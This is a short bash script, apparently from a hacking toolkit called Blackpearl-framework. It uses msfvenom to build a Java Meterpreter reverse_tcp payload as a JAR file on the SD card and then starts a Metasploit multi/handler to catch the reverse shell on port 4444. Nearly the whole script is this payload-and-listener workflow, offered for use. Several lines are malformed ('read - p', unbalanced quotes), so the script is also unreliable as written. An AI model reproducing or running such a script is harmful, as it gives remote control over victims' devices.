#!/bin/bash
g='\e[1;32m'
r='\e[1;31m'
clear 
echo 
read - p "Enter your ip" ip
echo
echo "Making Payload"
echo
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /sdcard/file.jar
echo -e $g"~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e $g "YOUR PAYLOAD IS SAVED IN SDCARD"
echo "\
echo -e $r "  *WAITING FOR REMOTE LISTENER*
echo -e $g "~~~~~~~~~~~~~~~~~~~~~~~~~"
echo " Opening metasploit meterpreter"
msfconsole -q -x "use exploit/multi/handler ; set payload java/meterpreter/reverse_tcp ; set lhost $ip ; set lport 4444 ; exploit ;"
echo
echo
read -p "Press enter to go back" enter
cd Blackpearl-framework/lib
python msf.py
